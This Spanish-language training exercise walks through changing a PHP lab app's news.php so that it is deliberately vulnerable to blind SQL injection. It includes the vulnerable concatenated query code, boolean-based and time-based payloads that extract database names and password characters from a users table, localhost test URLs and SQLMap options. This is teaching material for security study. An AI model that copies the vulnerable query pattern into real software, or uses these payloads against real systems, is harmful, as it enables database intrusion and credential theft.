# Ejercicio 4: Implementar Blind SQL Injection

## 🎯 Objetivo
Modificar la aplicación para que sea vulnerable solo a **Blind SQL Injection** pero no a SQL Injection normal.

## 🔄 Cambios Necesarios

Para implementar Blind SQLi, necesitamos:

1. **Ocultar los resultados** de las consultas SQL
2. **Mantener la vulnerabilidad** en la concatenación
3. **Mostrar solo respuestas booleanas** (existe/no existe)
4. **Eliminar información detallada** de los errores

## 🛠️ Implementación

### Modificaciones en `news.php`:

```php
// CÓDIGO VULNERABLE SOLO A BLIND SQL INJECTION
// No muestra resultados directos, solo confirmación de existencia

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    
    try {
        // VULNERABILIDAD: Concatenación directa (vulnerable)
        $query = "SELECT id FROM blog WHERE id = " . $id;
        $result = $pdo->query($query);
        
        // BLIND: Solo confirmamos si existe o no
        if ($result && $result->rowCount() > 0) {
            $article_exists = true;
        } else {
            $article_exists = false;
        }
    } catch(PDOException $e) {
        // BLIND: No mostramos errores específicos
        $article_exists = false;
    }
}
```

### Respuesta de la Aplicación:
- ✅ **Artículo existe:** Mensaje genérico "Artículo encontrado"
- ❌ **Artículo no existe:** Mensaje genérico "Artículo no encontrado"
- 🔒 **Sin datos sensibles:** No se muestran títulos, contenido, ni errores SQL

## 🧪 Diferencias con SQL Injection Normal

### ❌ SQL Injection Normal (Ya no funcionará):
```sql
-- Estas consultas YA NO mostrarán datos:
id = 1 UNION SELECT name,email,password FROM users
id = 1 UNION SELECT version(),database(),now()
```
**Resultado:** Solo "Artículo encontrado" - sin datos útiles

### ✅ Blind SQL Injection (Funcionará):
```sql
-- Estas consultas permitirán inferir información:
id = 1 AND (SELECT COUNT(*) FROM users) > 0    -- True/False
id = 1 AND (SELECT LENGTH(password) FROM users LIMIT 1) = 8    -- True/False  
id = 1 AND (SELECT SUBSTRING(database(),1,1)) = 'a'    -- True/False
```
**Resultado:** "Encontrado" o "No encontrado" - permite inferir datos

## 🔍 Técnicas de Explotación Blind SQLi

### 1. Boolean-based (Basado en Booleanos)
```sql
-- Verificar si existe tabla users
id = 1 AND (SELECT COUNT(*) FROM users) > 0

-- Verificar longitud de password del primer usuario  
id = 1 AND (SELECT LENGTH(password) FROM users LIMIT 1) = 8

-- Extraer primer carácter del nombre de BD
id = 1 AND (SELECT SUBSTRING(database(),1,1)) = 'a'
```

### 2. Time-based (Basado en Tiempo)
```sql
-- Si es verdadero, demora 5 segundos
id = 1 AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)

-- Extraer datos carácter por carácter con demora
id = 1 AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a', SLEEP(3), 0)
```

## 📊 Proceso de Extracción Manual

### Fase 1: Confirmación de Vulnerabilidad
```sql
id = 1    -- Debería retornar "Artículo encontrado"
id = 999  -- Debería retornar "Artículo no encontrado"  
id = 1 AND 1=1  -- Debería retornar "Artículo encontrado"
id = 1 AND 1=2  -- Debería retornar "Artículo no encontrado"
```

### Fase 2: Reconocimiento de Base de Datos
```sql
-- Verificar existencia de tabla users
id = 1 AND (SELECT COUNT(*) FROM users) > 0

-- Contar usuarios
id = 1 AND (SELECT COUNT(*) FROM users) = 3

-- Verificar nombre de BD
id = 1 AND (SELECT SUBSTRING(database(),1,1)) = 'a'
```

### Fase 3: Extracción de Datos
```sql
-- Longitud del primer password
id = 1 AND (SELECT LENGTH(password) FROM users LIMIT 1) = 8

-- Primer carácter del password
id = 1 AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a'

-- Segundo carácter del password  
id = 1 AND (SELECT SUBSTRING(password,2,1) FROM users LIMIT 1) = 'd'
```

## ⚠️ Limitaciones del Blind SQLi

### Desventajas:
- 🐌 **Muy lento**: Requiere múltiples consultas
- 🔧 **Complejo**: Necesita automatización 
- 📊 **Inferencial**: Solo True/False responses
- ⏱️ **Time-consuming**: Extracción carácter por carácter

### Ventajas:
- 🔒 **Más sigiloso**: Menos detectable en logs
- 🌐 **Más común**: Muchas apps ocultan errores SQL
- 🛡️ **Bypasses WAF**: Evita firmas de UNION/SELECT
- 🎯 **Realista**: Escenario común en producción

## 🛠️ Herramientas para Automatización

### Manual:
- **Burp Suite**: Intruder con payloads booleanos
- **Browser**: Consultas manuales con observación

### Automatizado:  
- **SQLMap**: `--technique=B` (Boolean-based)
- **SQLMap**: `--technique=T` (Time-based)
- **Scripts custom**: Python/Bash para automatizar

## 📋 URLs de Prueba (Después de implementar)

### Verificación básica:
```
http://localhost/news.php?id=1
http://localhost/news.php?id=1%20AND%201=1  
http://localhost/news.php?id=1%20AND%201=2
```

### Reconocimiento:
```
http://localhost/news.php?id=1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%20%3E%200
```

### Extracción:
```
http://localhost/news.php?id=1%20AND%20(SELECT%20LENGTH(password)%20FROM%20users%20LIMIT%201)%20=%208
```

---

## 🎓 Conceptos Clave

1. **Blind SQLi**: Inyección sin output directo de datos
2. **Boolean-based**: Inferir datos por respuestas True/False  
3. **Time-based**: Usar delays para confirmar condiciones
4. **Inferencial**: Extraer datos bit a bit
5. **Automatización**: Necesaria para extracción práctica

---
**Estado:** 🔄 Listo para implementar
**Siguiente:** ✅ Implementar código Blind SQLi en `news.php`
